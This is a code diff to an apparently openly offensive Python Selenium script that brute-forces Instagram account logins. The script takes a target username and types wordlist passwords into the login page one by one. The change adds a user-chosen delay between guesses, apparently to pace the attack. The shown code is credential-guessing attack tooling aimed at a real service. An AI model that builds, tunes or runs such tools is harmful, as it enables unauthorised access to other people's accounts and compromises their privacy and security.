@@ -21,6 +21,8 @@ time.sleep(1)
 print("Please enter account's username")
 username = input()
 
+timer_delay = int(input("Enter Bruteforce timer delay"))
+
 def startBruteforce(driver):
     try:
         driver.get(f"https://www.instagram.com/accounts/login/")
@@ -75,7 +77,7 @@ def startBruteforce(driver):
                      passwordField.send_keys(line)
                      print(f"Trying Password {line}")
                     #  print("Before clearing:", passwordField.get_attribute("value"))
-                     time.sleep(1)
+                     time.sleep(timer_delay)
                      passwordField.click()
                      passwordField.clear()
                      driver.execute_script("arguments[0].focus();", passwordField)
